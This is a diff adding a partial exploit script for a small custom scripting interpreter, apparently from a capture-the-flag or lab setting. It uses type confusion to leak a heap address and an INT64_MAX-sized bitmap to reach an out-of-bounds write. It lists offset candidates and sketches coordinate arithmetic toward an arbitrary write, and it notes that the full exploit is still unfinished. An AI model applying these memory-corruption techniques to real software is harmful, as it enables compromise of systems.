@@ -1,0 +1,39 @@
+print("=== Test Address Estimates ===");
+
+print("Step 1: Leak heap address");
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+print("Step 2: Test different entry address offsets");
+print("entry_addr candidates:");
+print("  candidate1 = targetaddr - 0x200");
+print("  candidate2 = targetaddr - 0x300");
+print("  candidate3 = targetaddr - 0x400");
+
+print("Step 3: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 4: Test different bitmap buffer offsets");
+print("bitmap_data_ptr candidates:");
+print("  candidate1 = targetaddr + 0x800");
+print("  candidate2 = targetaddr + 0x1000");
+print("  candidate3 = targetaddr + 0x2000");
+
+print("Step 5: Calculate coordinates for each combination");
+print("For each entry_addr and bitmap_data_ptr:");
+print("  value_ptr_addr = entry_addr + 0x28");
+print("  offset = value_ptr_addr - bitmap_data_ptr");
+print("  y = (offset * 8) / INT64_MAX");
+print("  x = (offset * 8) % 8");
+
+print("Step 6: Test write");
+print("Write test value (e.g., 0x41414141) to value_ptr_addr");
+print("Then read: int test = target;");
+print("If test == 0x41414141, addresses are correct!");
+
+print("Note: This requires implementing bit-by-bit write first");
+print("Once addresses are found, can proceed with full exploit");
+
